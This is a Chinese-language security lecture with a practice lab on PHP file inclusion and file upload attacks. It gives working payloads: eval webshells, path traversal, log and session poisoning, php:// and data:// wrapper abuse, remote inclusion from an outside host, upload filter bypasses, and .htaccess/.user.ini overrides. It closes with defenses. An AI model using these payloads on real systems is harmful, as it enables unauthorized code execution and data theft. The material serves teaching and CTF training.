其四

文件包含与文件上传

这两个漏洞总是成对出现，原因很实在： 上传负责把代码写进服务器，包含负责让服务器执行它。 一个给刀，一个给手。合起来，就是一次 RCE。

第四讲 · 包含的四条路 + 上传的八种绕法 · 含 1 个文件靶场

这一讲在讲什么

前三讲的洞，大多停在"能读到不该读的东西"。 这一讲不一样 —— 它讨论的是怎么让服务器跑你写的代码。

路径只有两条：

  • 文件包含 —— 服务器本来就有个功能，能把别的文件当代码执行。 如果你的输入能决定"包含哪个文件"，那就能让它执行你的文件。
  • 文件上传 —— 服务器允许你传文件。如果传上去的文件能被执行， 那也是一样的效果。

单独看，这两条路都可能被堵死。但真实环境里它们常常同时存在： 上传点只允许图片，可旁边有个文件包含 —— 传个图片马，包含它，照样执行。 这就是为什么讲台上把这两块放在一起讲。

文件包含：把文件当代码执行

C 语言用 #include 引头文件，Python 用 import 引库， PHP 也有一套类似的东西，但行为不太一样。

关键的一点：PHP 的包含，会把那个文件当成 PHP 代码来解析， 哪怕它的后缀是 .txt、.jpg。

具体怎么解析？

  • 不在 <?php ?> 里的部分，原样输出
  • 在 <?php ?> 里的部分，当代码执行

举个例子。建一个 test.php：

<?php include '1.txt'; ?>

同目录放一个 1.txt：

123456
<?php echo 'hello'; ?>
include 'world'

访问 test.php，输出是：

123456
hello  include 'world'

看出来了吧：123456 原样输出，hello 是被执行的， 最后那行因为没有 <?php 包裹，也原样输出。

这意味着什么

只要你能控制被包含的文件，就能在里面写 PHP 代码，让它执行。 而这个"文件"不一定得是 .php —— 图片、日志、Session 文件，都能当载体。

后面所有技巧，追根到底都是在解决一个问题： 怎么让服务器去包含一个"我写入了内容"的文件。

四个包含函数

名字都差不多，差别只在两件事上：找不到文件时的态度，和重复包含时的态度。

函数找不到文件重复包含
include()警告，继续跑再次包含
include_once()警告，继续跑跳过
require()报错，直接退出再次包含
require_once()报错，直接退出跳过

做题时这个区别有意义：如果用的是 require，包含失败页面上会报错， 你能从报错信息里看到它拼出来的完整路径 —— 等于白送你一个调试手段。

什么样的代码会中招

<?php
$file = $_GET['file'];
include $file;
?>

四行，就这么简单。访问 ?file=/etc/passwd，页面就把系统的用户列表打出来了。

这个洞的专业名字叫 LFI（本地文件包含）。 如果参数里能填 http:// 开头的远程地址，让 PHP 去别的服务器拉文件下来执行， 那就叫 RFI（远程文件包含） —— 前提是 php.ini 里 allow_url_include 是开的（现在默认关）。

一句话木马，和它能干什么

文件包含如果只能读文件，那顶多是信息泄露。真正让它变成 RCE 的， 是包含一个内容可控的文件。

而被包含的文件里写什么？写这个：

<?php @eval($_POST['a']); ?>

一行 PHP，业内叫「一句话木马」。拆开看四部分：

部分作用
$_POST['a']从请求体里取名为 a 的参数
eval(...)把取到的字符串当 PHP 代码执行
@抑制报错，别让页面吐一堆 warning 暴露自己
末尾的 ;不能丢。少了它就是语法错误，整行白写

所以当你 POST 一个 a=system('cat /flag'); 过去， eval 就把它当代码跑了，flag 就出来了。

一句话木马的本质：开一个口子，让任意 PHP 代码从外面进来执行。

两个常用变体：

<?php @eval($_GET[1]); ?>    // 实测方便：地址栏直接打 ?1=phpinfo();
<?php @eval($_POST['a']); ?> // 蚁剑这类工具默认发 POST

$_GET[1] 里那个 1 不加引号，是为了少打两个字符 —— 不是语法必须。

为什么工具喜欢 POST

因为 GET 的 payload 会进 URL、进日志、被各种地方记录。 POST 在请求体里，隐蔽一点，也方便放长内容。

路径：先搞清楚自己在哪

构造包含路径时，三个符号要分清：

  • / —— 根目录
  • ./ —— 当前目录
  • ../ —— 上一级目录

开头这三者都没有，默认就按当前目录算。

还有一个反直觉的点：../ 多了不会报错。 超出根目录之后再往上，还是指向根目录。所以你看到一长串 ../../../../../../ 不用数，够多就行。

能读文件之后，看什么

拿到任意文件读取，别只顾着看 /etc/passwd（那个只能证明洞存在）。 真正的目标是能推进下一步的东西：

路径里面通常有什么
/etc/passwd用户列表。看有哪些用户、能不能登录
/etc/shadow密码哈希。一般没权限读，读到了就是大事
/proc/self/environ当前进程的环境变量。很多秘密藏在这儿
/proc/self/cmdline当前进程的启动命令，能看出路径和服务类型
/proc/1/environPID 1 的环境变量
/etc/crontab定时任务。如果能写进去……
/flagCTF 里最常见的落点

配置文件里往往有更值钱的东西：

  • /etc/httpd/conf/httpd.conf、/etc/nginx/nginx.conf —— Web 服务器配置，能看出网站根目录、日志路径
  • /etc/my.cnf —— MySQL 配置，可能有数据库账号
  • /etc/redhat-release、/etc/issue —— 系统版本，用来找已知漏洞
  • /etc/sysconfig/iptables —— 防火墙规则

扫描这些路径的时候，Burp 的 Intruder 比手工一个个试快得多。

进阶：日志、Session、伪协议

能读文件了，但读了一圈没找到 flag，也找不到能写入的地方 —— 怎么办？

想想：服务器上有没有"我往里面写过东西"的文件？

日志包含

有。访问日志。

每次请求，服务器都会往 access.log 里记一行， 里面包含你的 IP、请求的 URL、User-Agent、Referer。 而 UA 和 Referer 是你随便写的。

一条 Nginx 日志长这样：

127.0.0.1 - - [16/Oct/2023:18:46:47 +0800] "GET /DVWA/favicon.ico HTTP/1.1" 200 1406 "http://localhost/DVWA/setup.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."

最后那个引号里就是 UA。如果你把它改成 <?php @eval($_POST[a]);?>， 这行代码就被写进日志文件了。

然后再包含日志文件 —— 它里面的 PHP 段就执行了。

一个必踩的坑

不能直接在地址栏里发。浏览器会把 URL 里的 <、? 这些做 URL 编码， 写进日志的是编码后的字符串 —— 编码过的 PHP 代码不会执行。

正确姿势：Burp 抓包，把 UA 改成原始字符放过去。这样日志里存的就是原文。

日志在哪儿？看服务器配置。phpstudy 的话在 Extensions/Apache/logs 或 Nginx/logs 下面； 有 phpinfo 的话，也能从里面看。

Session 包含

第二条路：Session 文件。

Session 和 Cookie 有点像，区别是数据存在服务器上。 用户一访问，服务器就给他分配一个 PHPSESSID， 然后在 session.save_path 目录下建一个 sess_PHPSESSID 的文件。请求结束时，Session 内容写进去。

所以：只要你的某个输入被存进了 Session，你就往服务器上写进了一个文件。 再包含它 —— 执行。 

<?php
session_start();
// ...
$_SESSION['username'] = base64_encode($username);   // 用户输入进了 session
?>

Session 文件一般在：

  • /var/lib/php/sess_PHPSESSID
  • /tmp/sess_PHPSESSID
  • /tmp/sessions/sess_PHPSESSID

那个 PHPSESSID 就是你 Burp 里看到的那串 Cookie。 最稳的办法是看 phpinfo 里的 session.save_path， 没有的话就这几个地方挨个试。

一条通用思路

日志包含和 Session 包含，本质是同一个思路： 找一个"我能写入内容、又能被包含"的文件。

同类的还有：上传的临时文件（/tmp/phpXXXXXX）、 /proc/self/environ（UA 会被写进这里的 HTTP_USER_AGENT）、 邮件日志、甚至数据库文件。思路打开，载体到处都是。

伪协议：路径的另一种写法

伪协议是 PHP 的一套"协议包装器"。长得像路径，背后接的不是磁盘文件。 用法都一样：直接当 include 的参数。

写法作用条件
file:// 读本地文件。include 'file:///etc/passwd'; 不受 allow_url_* 限制
php://filter 读文件源码（编码后输出，不执行） 默认可用
php://input 把 POST 请求体当 PHP 代码执行 allow_url_include=on
data:// 把 URL 里的字符串当代码执行 allow_url_fopen + allow_url_include
zip:// 读压缩包内的文件并执行 无
phar:// 同上，写法不同 无

php://filter —— 读源码，不执行

include 'index.php' 会把源码当代码跑掉，页面上只剩输出， 你看不到源码。php://filter 解决的就是这个问题： 

?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php

它先把文件内容 base64 编码，再输出。编码后的内容不会被当作 PHP 解析， 所以你就能看到源码了 —— 复制出来解个 base64 就行。

base64 被过滤了？还有别的过滤器，比如 convert.iconv.SJIS*.UCS-4*/resource=/、string.strip_tags。 这块深挖下去很复杂（还有 FilterChain 之类的进阶用法），入门阶段知道 base64 这个就够。

php://input —— 把请求体当代码

GET /input.php?file=php://input HTTP/1.1
Host: localhost
Content-Length: 25

<?php system('whoami');?>

include 读了请求体并执行，whoami 的结果回显在页面上。 前提是 allow_url_include 开着。

data:// —— 把字符串当文件

?file=data://text/plain,<?php phpinfo();?>

// 加一层 base64，绕 < ? 被过滤
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

zip:// 和 phar:// —— 藏在压缩包里

这两个最有意思：它们不看外层文件的扩展名，只看内容是不是合法的压缩包结构。 所以 .png、.jpg 都能当压缩包用。 

zip:///var/www/html/1.zip%23php.txt      // # 要写成 %23
phar://a.png/shell.php                    // phar 用 / 分隔，不用 %23

用法：把木马写进一个文件 → 连同它压成 zip → 上传（改后缀成 png 也行）→ 用 zip:// 或 phar:// 包含进去。

zip:// 被 WAF 拦了，可以换 bzip2://、zlib://，作用类似。

一个小技巧

如果上传点会"解压 zip 并检查包内文件名"，那就把包内的木马改成 .jpg 再压缩 —— 骗过检查，包含时照样能执行。

实操

打一遍文件靶场

  1. 跟着一键启动起来，或者手动进目录跑：
    php -S 127.0.0.1:8084 router.php
    在 lab/file_lab/ 下执行。地址 http://127.0.0.1:8084/。
  2. 第一关：无过滤的包含。猜猜 secret.txt 在哪儿。
  3. 第二关：代码给路径加了前缀，得想办法跳出去。
  4. 第三关：上传点什么都不查，传个一句话上去试试。
  5. 第四关：上传点查了 Content-Type，想想这个值是谁写的。

包含的绕过：前缀、后缀、过滤器

真实代码很少让你随便填路径。常见两种限制：给路径加前缀， 或者加后缀。两种都有绕法。

指定了前缀

<?php
$file = $_GET['file'];
include '/var/www/html/' . $file;
?>

想法很直接：把包含限制在这个目录里。但 ../ 是文件系统层面的， 代码管不着： 

?file=../../../../../../etc/passwd

拼出来：/var/www/html/../../../../../../etc/passwd
        ↑ 往上跳六层，就到根目录了

如果 ../ 被过滤了呢？三种常见绕法：

  • URL 编码 —— %2e%2e%2f，解码后才是 ../
  • 双写 —— ....//。过滤器删掉中间的 ../，剩下的正好拼回 ../
  • 编码差异 —— %C0%AF 在某些 Java 容器里会被解码成 /（原理类似第三讲的宽字节）

指定了后缀

<?php
$file = $_GET['file'];
include $file . '.jpg';
?>

这个麻烦点：你想包含的路径后面总被强行加上 .jpg。 三种绕法，但注意前提 —— 前两种只对远程包含有效：

  1. 问号绕过。?file=http://yourhost/1.php? 后面的 .jpg 被当成 URL 的查询参数，不再是文件名的一部分。
  2. 井号截断。# 后面算片段，也不进文件名。 但直接传 # 不行，要 URL 编码成 %23。
  3. data 伪协议。这个连远程服务器都不需要： ?file=data://text/plain,<?php ...?> —— 反正 .jpg 拼在后面，data 协议会把它当成数据的一部分。

文件上传：从表单到落盘

包含是"让服务器执行已有的文件"，上传是"把文件送进服务器"。 两条路合起来，就是完整的攻击链。

先认认文件是什么

计算机里的文件都是十六进制字节。记事本只能显示可见字符， 看不到真正的内容 —— 而且用记事本打开再保存，还可能把编码搞坏。 要看全貌得用十六进制查看器。

文件开头那几个字节叫魔数（magic number），用来标识文件类型：

类型文件头备注
jpgFF D8 FF结尾通常是 FF D9
gifGIF89a全是可见字符，做图片马最方便
png89 50 4E 47
zip50 4B 03 04PK 开头

还有个关键认知：Windows 下后缀名只是给系统看的标识， 改后缀不会改变文件内部结构。shell.php 改成 shell.jpg， 里面还是那段 PHP 代码。

那 include '1.jpg' 会输出什么？—— 把它当 PHP 解析， 里面的 FF D8 FF 这些不可见字节原样输出（浏览器里看到一堆乱码）， 而 <?php ... ?> 那部分会被执行。

一个上传页面的样子

<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file">
    <input type="submit" name="submit" value="提交">
</form>

enctype="multipart/form-data" 必须有。 不加这个，表单只会把文件名传过去，文件本身根本不上传。

后端怎么收

<?php
$target_dir  = "D:/phpstudy_pro/WWW/ezupload/upload/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);

if ($_FILES["file"]["error"] > 0) {
    echo "错误：" . $_FILES["file"]["error"];
} else {
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "上传成功";
    }
}
?>

$_FILES 这个超全局数组，五个字段要认全：

字段含义谁写的
['name']上传时的原始文件名客户端
['type']MIME 类型客户端
['tmp_name']服务器上的临时文件路径服务器
['error']错误码服务器
['size']文件大小（字节）服务器
这张表最重要的一列

name 和 type 是客户端自己写进请求里的。 你传 shell.php，name 就是 shell.php； 你写 Content-Type: image/jpeg，type 就是 image/jpeg。

所以：后端如果只检查这两个字段，等于什么都没检查。 后面一半的绕过手法，都是从这个事实长出来的。

上传报文长什么样

POST /ezupload/upload.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhyYhgDANYaiWoEGK
Content-Length: 332

------WebKitFormBoundaryhyYhgDANYaiWoEGK
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo 1234; ?>
------WebKitFormBoundaryhyYhgDANYaiWoEGK
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryhyYhgDANYaiWoEGK--

三个要点：

  • boundary 是分隔符，后面那串随机字符由浏览器生成。 报文里每个字段前面都有一条 ------WebKitFormBoundary...
  • filename="shell.php" 就对应 $_FILES['file']['name'] —— 这就是你能改的地方
  • Content-Type: application/octet-stream 对应 ['type'] —— 同样是你改的

没有前端页面也能传：Postman

有时候目标服务器有 $_FILES 接收，但没给你上传的页面。 那就自己构造请求。Postman 是干这个的工具 —— 注册个免费账号就能用， 比手写 multipart 报文舒服得多。

洞是怎么产生的

一句话：文件传上去了，而且传到了能被访问、被执行的地方。 

# 上传 1.php，内容是
<?php @eval($_GET[1]); ?>

# 提示存到了 /upload 目录
# 访问 /ezupload/upload/1.php?1=phpinfo();
# 页面弹出 phpinfo —— 命令执行了

从这一步开始，你就有了一个「Webshell」——一个能执行任意 PHP 的入口。

上传绕过：一层一层剥

真实的站不会让你直接传 .php。它通常会一层一层检查： 前端有没有拦、MIME 对不对、后缀在不在名单里、文件内容像不像图片。 每加一层，就多一种绕法。

第一层：前端验证 —— 最好绕

前端验证（JS 检查后缀之类）的本质是"浏览器替你先看一遍"。 而浏览器是你的，所以：

  • 禁用 JavaScript
  • 直接改前端代码
  • 先传一个合规的文件，让它通过前端检查；抓到包之后，再把包里的文件名和内容换成恶意文件

第三种最通用 —— 因为前端只影响"请求发不发得出去"，不影响"请求长什么样"。

第二层：MIME 检查

如果后端这样写： 

if ($_FILES["file"]["type"] == "image/jpeg") { ... }

那它检查的就是报文里 Content-Type 那一行。 抓包，把 application/octet-stream 改成 image/jpeg，过了。

常见 MIME 类型记几个：

MIME含义
text/plain纯文本
text/htmlHTML 文档
image/jpegJPEG 图像
image/pngPNG 图像
image/gifGIF 图像
application/octet-stream二进制流（默认）
application/pdfPDF

第三层：后缀黑名单

后端检查文件名后缀，不允许 .php。绕法一大堆：

手法例子说明
冷门后缀 .php3 .php4 .php5 .phtml .pht .phps 黑名单经常漏。能不能执行看中间件配置，老环境默认就认
大小写 .Php .PHP Windows 下的 Apache / IIS 一般认；Linux 通常不认（区分大小写）
双写 .pphphp 后端把 php 替换成空格后，正好拼回 .php
Windows 命名 1.php.、1.php[空格] Windows 会自动去掉结尾的点和空格，存下来还是 1.php。尾空格得抓包改
%00 截断 1.php%00.jpg 只对 PHP < 5.3.4 有效。C 层遇到 \0 就认为字符串结束
%00 怎么打进报文

直接在 Burp 里敲 %00 是不行的（那是字面的百分号）。 两个办法：

  • 选中 %00，右键 → Convert → URL → URL-decode，把它变成真正的空字节
  • 或者先用一个占位符（比如 +），切到 Hex 视图，把 2b 改成 00

第四层：文件内容检查

后端读文件前几个字节，看是不是 FF D8 FF（jpg）或者 GIF89a（gif）。 这种检查叫魔数检测。

绕法就是图片马：先传一张正常图片，抓包，在文件末尾追加 PHP 代码： 

GIF89a<?php @eval($_POST['a']); ?>

这样它既通过魔数检查（开头是 GIF89a），又包含可执行代码。

为什么推荐 gif？因为 GIF89a 全是可见字符，在 Burp 里直接手敲就行， 不用十六进制编辑器。

图片马的关键用法

图片马直接访问通常打不动。 服务器看到 .jpg 就当图片发出去，不会解析里面的 PHP。

它的正经用法是配合文件包含： ?file=upload/shell.jpg，包含一下，里面那段 PHP 就执行了。

这就是这一讲为什么把两块放在一起：单独都不致命，合起来就通了。

第五层：短标签

如果 eval、system 这些词被过滤了，试试换标记方式： 

<? echo '123'; ?>            // short_open_tag = on
<?=(表达式)?>                // 等价于 <?php echo ...?>
<% echo '123'; %>            // asp_tags = on，PHP 7 以下
<script language="php">...</script>  // PHP 7 以下

短标签在文件包含里特别有用 —— 有些过滤器只认 <?php， 换个写法就绕过去了。

解析漏洞：让非 PHP 文件被执行

实在传不了 .php，那就换个思路： 让服务器把别的后缀也当 PHP 执行。

.htaccess

Apache 的目录级配置文件。传一个叫 .htaccess 的文件（开头的点别丢）， 就能改变这个目录的解析规则： 

<IfModule mime_module>
    SetHandler application/x-httpd-php
</IfModule>

这行的意思是：这个目录下所有文件都按 PHP 解析。想精准点：

AddType application/x-httpd-php .jpg

只让 .jpg 当 PHP 跑。

流程：传 .htaccess → 传一个黑名单外的文件（内容换成木马）→ 访问它 → 执行。

利用条件：服务器没禁止上传 .htaccess， 且允许用户自定义配置。

.user.ini

PHP 5.3.0 之后的配置文件，作用类似但专门管 PHP。两个关键项： 

auto_prepend_file = <filename>    // 自动包含在文件头
auto_append_file  = <filename>    // 自动包含在文件尾

流程：传 .user.ini（内容 auto_prepend_file = 1.jpg）→ 传 1.jpg（内容是木马）→ 访问同目录下任意一个 php 文件，木马就被自动包含执行了。

利用条件：目标目录下至少要有一个 php 文件。

Nginx 的路径修复

这个跟 PHP 的一个配置项 cgi.fix_pathinfo 有关，默认是 1（开启）。

访问 /test.jpg/test.php 时：Nginx 看到后缀是 .php，转给 PHP； PHP 发现 /test.jpg/test.php 不存在，就从前到后修路径 —— 去掉 /test.php，发现 /test.jpg 存在，就把它当脚本执行。

所以：传一个 1.jpg（内容含 PHP），访问 1.jpg/2.php，就能执行。

cgi.fix_pathinfo=1 的行为是：遇到 /1.jpg/2.txt/3.php 不存在，就一层层往前削，直到找到存在的那个文件。

IIS 6 / 7 的老姿势

  • IIS 6 分号截断：1.asp;.jpg
  • IIS 6 目录解析：1.asp/1.jpg
  • IIS 7.0 / 7.5：访问 /upload/1.jpg/.php，IIS 把 .php 之前的部分当脚本、.php 当 PATH_INFO，于是 1.jpg 被当 PHP 执行

这些都是老环境里的东西，遇到了再查，不用背。

条件竞争：赌那个毫秒级的窗口

有的代码逻辑是这样：

  1. 先把文件原样存下来
  2. 然后检查后缀
  3. 合规就重命名，不合规就删掉

看起来没问题？问题在于第 1 步和第 3 步之间有个时间窗口。 在这段时间里，那个文件已经存在、而且能被访问。

所以三种情况：

  • 在存下来之前访问 → 没这个文件
  • 存下来之后、删除之前访问 → 文件在，执行成功
  • 删除之后访问 → 没这个文件

打法：Burp 开两个 Intruder 同时跑， 一个不停上传，一个不停访问目标路径，赛跑。

这叫条件竞争（Race Condition）。 窗口可能只有几十毫秒，所以请求量要大、要并发。

这类洞的共同点

条件竞争不只是文件上传才有。凡是"先做一件事、后做检查"的逻辑， 中间都有缝 —— 领优惠券、转账、改密码、下载文件，都是同一个模型。

修法是加锁：保证一个进程在操作某资源时，别的进程进不来。

防御

文件包含的防御

措施说明
open_basedir 限制 PHP 能访问的目录范围。注意限制的是前缀不是目录： /dir/user 这个配置下，/dir/user1 也能访问 —— 想严格限制，路径要以斜线结尾
权限管理 敏感文件（日志、配置）不给 Web 用户读权限
白名单 只允许包含指定目录、指定后缀的文件
关 allow_url_fopen / allow_url_include 能挡大部分远程包含，但挡不住 file://、php://filter、日志包含
不用动态包含 最根本的一条：别让 $_GET 参与路径
open_basedir 能被软链接绕过

软链接（类似快捷方式）指向外面的目录，PHP 跟着走就出去了。 所以它也不是铁板一块，只是提高门槛。

文件上传的防御

措施说明
白名单 只允许特定后缀，白名单永远比黑名单可靠
重命名 用 uniqid() 之类生成随机名，且不回显。 这样你不知道文件叫什么，也就访问不到。同理可以生成随机目录
控制权限 上传目录不给执行权限。要用文件内容就走脚本读取，别让 Web 直接执行
禁用危险配置 上传目录里把 .php 等当纯文本；关掉 cgi.fix_pathinfo
压缩图片 重新编码一遍，把藏在里面的恶意代码破坏掉
进程锁 防条件竞争 
<Directory "/uploads">
    Options -ExecCGI
    AddType text/plain .php .asp .jsp
</Directory>

这段 Apache 配置的意思是：上传目录里，.php / .asp / .jsp 全部当作纯文本，不许执行。
